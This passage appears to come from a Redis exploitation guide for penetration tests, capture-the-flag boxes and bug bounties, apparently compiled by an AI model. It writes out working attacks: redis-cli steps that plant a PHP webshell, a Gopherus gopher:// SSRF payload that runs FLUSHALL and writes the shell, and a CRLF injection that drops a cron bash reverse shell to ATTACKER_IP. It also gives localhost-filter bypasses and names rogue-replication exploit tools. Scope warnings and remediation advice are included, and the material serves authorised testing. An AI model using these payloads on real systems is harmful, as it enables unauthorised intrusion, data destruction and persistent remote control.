- **The write proof:** the `CONFIG GET dir`/`dbfilename` *before* values, the `CONFIG SET`+`SET`+`SAVE` exchange, and the resulting artifact (the webshell responding to `?c=id`, the SSH login banner, the cron callback) — paired, so the cause and effect are in one place.
- **The RCE proof:** a single `id`/`hostname`/`whoami` output showing the process user. Do not spawn persistence, do not pivot further than one metadata read, do not read application data beyond one record that demonstrates class.
- **Severity framing:** unauthenticated network-reachable Redis that reaches code execution is Critical; open Redis exposing only data (no writable ladder, managed/hardened) is High–Medium by data sensitivity; a protected instance where only `rename-command`/ACL obscurity stands between you and the ladder is a hardening note with a clear upgrade path.
- **Remediation one-liner for the report:** set `requirepass` or ACLs, keep `protected-mode yes`, `bind` to private interfaces, run as an unprivileged user with no writable web/cron/spool paths, patch off the Lua-cluster and sandbox-escape versions, and network-segment the cache from the web tier and the metadata service.

### S.8 The file-write primitive — decoding success and failure

Every Phase 6 file-write rung (6.1–6.3) shares one primitive and one failure surface. The commands succeed with `+OK` at every step and the write still silently misses — because `+OK` only confirms Redis accepted the instruction, never that the file is usable. Decode each step's real signal:

```bash
redis-cli -h 198.51.100.10 CONFIG SET dir /usr/share/nginx/html
# +OK            -> dir is writable by the redis user AND the path exists
# -ERR Changing directory: No such file or directory   -> path wrong; CONFIG GET dir still shows the OLD dir
# -ERR Changing directory: Permission denied           -> redis user can't write there; pick another rung/path
redis-cli -h 198.51.100.10 CONFIG SET dbfilename shell.php
# -ERR dbfilename can't be a path, just a filename      -> you put a "/" in it; set dir separately
redis-cli -h 198.51.100.10 SET x "<?php system(\$_GET['c']); ?>"
redis-cli -h 198.51.100.10 SAVE
# +OK            -> RDB written to <dir>/<dbfilename>
# -ERR ... Permission denied / Read-only file system    -> dir resolved but the FILE can't be created
# -MISCONF Redis is configured to save RDB snapshots, but ... persistence error  -> a PRIOR save failed;
#          clears after a good BGSAVE or 'CONFIG SET stop-writes-on-bgsave-error no'
```

Then the end-to-end validation, which is the only signal that matters:

```bash
curl -s "http://198.51.100.10/shell.php?c=id"
# uid=33(www-data) ...           -> webshell live (PHP found <?php inside the RDB binary and executed it)
# <binary garbage> then nothing  -> file written but the PHP block was corrupted by RDB bytes around it:
#                                   FLUSHALL first (DESTRUCTIVE) for a clean DB, re-SET, re-SAVE
# 404 / nginx default            -> wrong webroot: re-read CONFIG GET dir, try /var/www/html, /var/www/public
```

The corruption case is the one that wastes the most time: RDB is a binary format and your payload is a string value embedded in it. PHP tolerates surrounding junk (it scans for `<?php`); SSH's `authorized_keys` and cron parsers tolerate junk *lines* (hence the blank-line padding in 6.2/6.3); but a strict parser will choke. If the artifact exists but does not fire, the DB had other keys whose bytes landed adjacent to the payload — the clean-DB `FLUSHALL` is the fix, and the reason that step is marked DESTRUCTIVE.

Replica trap: if `INFO replication` showed `role:slave`, `CONFIG SET dir`/`SAVE` may be refused (`-READONLY`) or your write gets clobbered on the next master sync. Break replication first (`SLAVEOF NO ONE`) only if the program permits — it is a state change on a production node.

### S.9 Worked SSRF-to-Redis payloads (gopher and CRLF)

Phase 5 named the pivot; these are the exact byte streams. Redis speaks either inline commands (space-separated, newline-terminated) or RESP arrays. Over an SSRF primitive you cannot send a redis-cli session — you forge the wire bytes.

**gopher:// (purpose-built for raw TCP).** The payload is `gopher://127.0.0.1:6379/_` + URL-encoded RESP. Generate it rather than hand-rolling — **Gopherus** emits ready chains:

```bash
python2 gopherus.py --exploit redis       # interactive: choose PHPShell / ReverseShell / SSHKey, it prints the URL
# example emitted stream (webshell), already URL-encoded for a single-hop SSRF parameter:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2A...
```

Decoded, that is the RESP form of the ladder — `FLUSHALL`, then `SET 1 "<?php ...>"`, `CONFIG SET dir <webroot>`, `CONFIG SET dbfilename shell.php`, `SAVE`. The `%0D%0A` pairs are the CRLF line terminators RESP requires; `%2A` is `*` (array header), `%24` is `$` (bulk-string length).

**CRLF injection over HTTP (the GitLab 11.4.7 archetype).** When the SSRF is an HTTP fetcher, you inject newlines into a header or URL so the raw request body, as Redis sees it line by line, becomes inline commands. Redis answers `-ERR unknown command 'GET'` / `-ERR unknown command 'Host:'` to the HTTP lines and happily executes the injected ones:

```
# injected via a %0D%0A-carrying parameter; Redis ignores the HTTP noise, runs the tail
... %0D%0A config set dir /var/spool/cron %0D%0A config set dbfilename root %0D%0A set x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1\n\n" %0D%0A save %0D%0A
```

Validation signal for the pivot itself (before any exploitation): an out-of-band or reflected `-ERR unknown command 'Host:'` is protocol-level proof that the fetcher reached Redis — capture it as the SSRF finding independent of whether a write lands. IPv6/parser bypasses for "localhost" string filters: `[::1]:6379`, `[0:0:0:0:0:ffff:127.0.0.1]:6379`, decimal/octal `2130706433:6379`.

**CTF vs bounty here:** on a CTF box, lead with the Gopherus `FLUSHALL`+webshell chain — fast, destructive, fine. On a bounty, the `-ERR unknown command 'Host:'` capture alone is often the reportable finding; do not fire the `FLUSHALL` chain against a production cache to "prove" it.

### S.10 References (supplement)

- Redis security advisory, CVE-2025-49844 "RediShell" (fixed 8.2.2 / 8.0.4 / 7.4.6 / 7.2.11 / 6.2.20) — https://redis.io/blog/security-advisory-cve-2025-49844/
- Sysdig analysis, CVE-2025-49844 RediShell — https://www.sysdig.com/blog/cve-2025-49844-redishell
- Wiz vulnerability DB, CVE-2025-49844 — https://www.wiz.io/vulnerability-database/cve/cve-2025-49844
- Rapid7 analysis, CVE-2022-0543 (Lua sandbox escape, PrivateTmp/MemoryDenyWriteExecute caveats) — https://www.rapid7.com/blog/post/ra-cve-2022-0543-analysis/
- NVD, CVE-2022-0543 — https://nvd.nist.gov/vuln/detail/CVE-2022-0543
- Ubuntu security tracker, CVE-2022-0543 (fixed package revisions) — https://ubuntu.com/security/CVE-2022-0543
- modracx, Redis RCE & Lua sandbox escape (verified libc.so.6 `system` payload) — https://www.modracx.com/blog/cve-redis-rce-lua-sandbox-escape/
- Knownsec 404, RCE exploits of Redis based on master-slave replication — https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
- n0b0dyCN/redis-rogue-server (rogue-master module-load tool) — https://github.com/n0b0dyCN/redis-rogue-server
- Ridter/redis-rce (auth-supporting fork) — https://github.com/Ridter/redis-rce
- AWS IMDSv2 documentation (token requirement, remediation framing) — https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html

*Supplement compiled 2026-11-19 by claude-opus-4-8. Primary sources: Redis security advisory and Sysdig/Wiz (CVE-2025-49844); Rapid7, NVD, Ubuntu tracker, and modracx (CVE-2022-0543, payload verified against the modracx write-up); Knownsec 404 and the n0b0dyCN/Ridter tool repositories (rogue replication); AWS IMDS docs and SSRF-to-metadata research (cloud pivots). Targets throughout use the reserved example.com / 198.51.100.0/24 ranges; CVE IDs, payload strings, and tool names are real and current as of the compile date.*
